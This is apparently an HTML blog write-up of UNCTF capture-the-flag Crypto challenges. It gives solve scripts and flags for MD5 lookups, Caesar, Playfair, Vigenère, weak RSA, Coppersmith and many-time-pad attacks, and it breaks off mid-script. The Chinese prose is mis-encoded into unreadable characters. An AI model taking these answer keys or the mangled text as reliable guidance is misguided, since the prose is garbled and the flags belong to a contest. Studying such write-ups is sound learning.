id="HUAQIANG"><a href="#HUAQIANG" class="headerlink" title="HUAQIANG"></a>HUAQIANG</h3><p>æ·±è‚²æ¯åŸé¢˜ ç”Ÿç“œè›‹å­ï¼Œå‚è€ƒ<a href="https://mp.weixin.qq.com/s/1V5BEsfdZNRKwWP1mCs8wQ">å®˜æ–¹wp</a>ï¼Œä»£ç é€»è¾‘ä¸ºä¸€ä¸ªVMï¼Œé€ä½çˆ†ç ´flagæ¯ä½çš„å¯è¡Œå€¼ï¼Œå¾—åˆ°æ»¡è¶³æ¡ä»¶çš„è¾“å…¥ï¼š<code>998bc64bbd919f27f44e5e2750644c</code>ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="md5-1"><a href="#md5-1" class="headerlink" title="md5-1"></a>md5-1</h3><p>çˆ†ç ´å¯è§å­—ç¬¦å¾—åˆ°md5è¡¨ï¼Œå†ä¾æ¬¡éå†å¯†æ–‡å–å‡ºç›¸åº”å­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">8d9c307cb7f3c4a32822a51922d1ceaa</span></span><br><span class="line"><span class="string">0d61f8370cad1d412f80b84d143e1257</span></span><br><span class="line"><span class="string">b9ece18c950afbfa6b0fdbfa4ff731d3</span></span><br><span class="line"><span class="string">800618943025315f869e4e1f09471012</span></span><br><span class="line"><span class="string">f95b70fdc3088560732a5ac135644506</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8277e0910d750195b448797616e091ad</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">92eb5ffee6ae2fec3ad71c777531578f</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">4a8a08f09d37b73795649038408b5f33</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">8fa14cdd754f91cc6554c9e71929cce7</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">cfcd208495d565ef66e7dff9f98764da</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">45c48cce2e2d7fbdea1afc51c7c6ad26</span></span><br><span class="line"><span class="string">1679091c5a880faf6fb5e6087eb1b2dc</span></span><br><span class="line"><span class="string">e1671797c52e15f763380b45e841ec32</span></span><br><span class="line"><span class="string">8f14e45fceea167a5a36dedd4bea2543</span></span><br><span class="line"><span class="string">c81e728d9d4c2f636f067f89cc14862c</span></span><br><span class="line"><span class="string">c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="string">c9f0f895fb98ab9159f51fd0297e236d</span></span><br><span class="line"><span class="string">a87ff679a2f3e71d9181a67b7542122c</span></span><br><span class="line"><span class="string">cbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="dddd"><a href="#dddd" class="headerlink" title="dddd"></a>dddd</h3><p>1æ¢ä¸º <code>.</code>ï¼Œ0æ¢ä¸º <code>-</code>ï¼Œæ‘©æ–¯å¯†ç è§£å¯†å¾—ï¼š<code>UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="caesar"><a href="#caesar" class="headerlink" title="caesar"></a>caesar</h3><p>ROT64å˜ç§å‡¯æ’’å¯†ç ï¼Œç”¨è„šæœ¬è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">ord</span>(<span class="string">&#x27;U&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">  <span class="keyword">if</span> s[i] == <span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;&#125;&#x27;</span> <span class="keyword">or</span> s[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    t += s[i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    t += dic[(dic.index(s[i])+d)%<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>æ¯”md5-1å¤šäº†ä¸€å±‚å¼‚æˆ–æ“ä½œï¼Œè¿˜åŸå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb</span></span><br><span class="line"><span class="string">c1fd731c6d60040369908b4a5f309f41</span></span><br><span class="line"><span class="string">80fdc84bbb5ed9e207a21d5436efdcfd</span></span><br><span class="line"><span class="string">b48d19bb99a7e6bb448f63b75bc92384</span></span><br><span class="line"><span class="string">39eaf918a52fcaa5ed9195e546b021c1</span></span><br><span class="line"><span class="string">795d6869f32db43ff5b414de3c235514</span></span><br><span class="line"><span class="string">f59a054403f933c842e9c3235c136367</span></span><br><span class="line"><span class="string">c80b37816048952a3c0fc9780602a2fa</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">cad06891e0c769c7b02c228c8c2c8865</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">470a96d253a639193530a15487fea36f</span></span><br><span class="line"><span class="string">4bdea6676e5335f857fa8e47249fa1d8</span></span><br><span class="line"><span class="string">810ecef68e945c3fe7d6accba8b329bd</span></span><br><span class="line"><span class="string">edbb7ab78cde98a07b9b5a2ab284bf0a</span></span><br><span class="line"><span class="string">44b43e07e9af05e3b9b129a287e5a8df</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">abed1f675819a2c0f65c9b7da8cab301</span></span><br><span class="line"><span class="string">738c486923803a1b59ef17329d70bbbd</span></span><br><span class="line"><span class="string">7e209780adf2cd1212e793ae8796ed7c</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">a641c08ed66b55c9bd541fe1b22ce5c0</span></span><br><span class="line"><span class="string">636a84a33e1373324d64463eeb8e7614</span></span><br><span class="line"><span class="string">6ec65b4ab061843b066cc2a2f16820d5</span></span><br><span class="line"><span class="string">a4a39b59eb036a4a8922f7142f874114</span></span><br><span class="line"><span class="string">8c34745bd5b5d42cb3efe381eeb88e4b</span></span><br><span class="line"><span class="string">5b1ba76b1d36847d632203a75c4f74e2</span></span><br><span class="line"><span class="string">d861570e7b9998dbafb38c4f35ba08bc</span></span><br><span class="line"><span class="string">464b7d495dc6019fa4a709da29fc7952</span></span><br><span class="line"><span class="string">8eb69528cd84b73d858be0947f97b7cc</span></span><br><span class="line"><span class="string">dd6ac4c783a9059d11cb0910fc95d4a</span></span><br><span class="line"><span class="string">4b6b0ee5d5f6b24e6898997d765c487c</span></span><br><span class="line"><span class="string">b0762bc356c466d6b2b8f6396f2e041</span></span><br><span class="line"><span class="string">8547287408e2d2d8f3834fc1b90c3be9</span></span><br><span class="line"><span class="string">82947a7d007b9854fa62efb18c9fd91f</span></span><br><span class="line"><span class="string">8ddafe43b36150de851c83d80bd22b0a</span></span><br><span class="line"><span class="string">c7b36c5f23587e285e528527d1263c8b</span></span><br><span class="line"><span class="string">2a0816e8af86e68825c9df0d63a28381</span></span><br><span class="line"><span class="string">63ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;</span>.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cc = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= cc[i-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">cc = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:].rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> k <span class="keyword">in</span> cc]</span><br><span class="line"><span class="built_in">print</span>(cc)</span><br><span class="line"></span><br><span class="line">s=<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>))</span><br><span class="line">t=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    t[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()]=<span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> cc:</span><br><span class="line">    flag += t[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; </span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>å¸¸è§„RSAã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p = gmpy2.iroot(n,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">f = p**<span class="number">3</span>*(p-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>è¯»åŠ å¯†æ–¹å¼ï¼Œæ˜æ˜¾çš„playfairå¯†ç ã€‚</p><p>æŒ‰ç…§keyæ’åˆ—å¥½å­—æ¯è¡¨ï¼Œæ‰‹åŠ¨æŠŠæ¯ä¸¤ä¸ªå­—æ¯å–å‡ºè§£å¯†åï¼Œæ’åˆ—ä¸º <code>UNCTFGODYOUKNOWPLAYFAIRX</code>ï¼Œåœ¨é€‚å½“çš„åœ°æ–¹åŠ ç¬¦å·åˆ†å‰²å•è¯ï¼š<code>UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Multi-table"><a href="#Multi-table" class="headerlink" title="Multi table"></a>Multi table</h3><p>å˜è¡¨ç»´å‰å°¼äºšå¯†ç ï¼Œå…ˆæ ¹æ®å‰4å­—ç¬¦ç¡®å®škeyå€¼ï¼Œå†éå†çˆ†ç ´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">base_table = [<span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line"></span><br><span class="line">table=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">  table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&#x27;UNCT&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;SDCG&#x27;</span></span><br><span class="line">key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  <span class="keyword">for</span> k,v <span class="keyword">in</span> table.items():</span><br><span class="line">    <span class="keyword">if</span> v[base_table.index(ori[i])] == res[i]:</span><br><span class="line">      key.append(k)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">  <span class="keyword">if</span> c[i] <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">    now = table[key[x%<span class="number">4</span>]].index(c[i]) </span><br><span class="line">    flag += base_table[now]</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    flag += c[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [9, 15, 23, 16]</span></span><br><span class="line"><span class="comment"># UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>æ³„éœ² $m$ é«˜ä½çš„Coppersmithæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">e =  <span class="number">6</span> </span><br><span class="line">mbar = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span class="number">60</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;</span>.<span class="built_in">format</span>(nbits - kbits, nbits))</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">m = mbar + x0</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><p>æ³„éœ² $p$ é«˜ä½çš„Coppersmithæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">n = <span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line">p4 = <span class="number">8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857</span></span><br><span class="line">e =  <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = <span class="number">200</span></span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line">p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;It is a very_intersting_test!!!&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="ezxor"><a href="#ezxor" class="headerlink" title="ezxor"></a>ezxor</h3><blockquote><p>ä½ çŸ¥é“å¤šæ¬¡ä¸€å¯†å—ï¼Ÿ</p></blockquote><p>å¤šæ¬¡ä¸€å¯†ï¼ˆMTPï¼‰æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line">ciphers = <span class="string">&#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d</span></span><br><span class="line"><span class="string">2160631d325b3b421c310601453c190814162d37404510041b55490d5d</span></span><br><span class="line"><span class="string">3060631d325b3e59033a1252102c560207103b22020613450549444f5d</span></span><br><span class="line"><span class="string">3420277421122f55067f1207152f19170659282b090b56121701405318</span></span><br><span class="line"><span class="string">212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a</span></span><br><span class="line"><span class="string">75222a22230877102137045212300409165928264c091f131701484f5d</span></span><br><span class="line"><span class="string">21272d33661237441a7f005215331706175930254c0817091b4244011c</span></span><br><span class="line"><span class="string">303c2674311e795e103a05520d300600521831274c031f0b160148555d</span></span><br><span class="line"><span class="string">3c3d63232909355455300752033a17175e59372c1c0056111d01474813</span></span><br><span class="line"><span class="string">752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110</span></span><br><span class="line"><span class="string">396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;</span>.split(<span 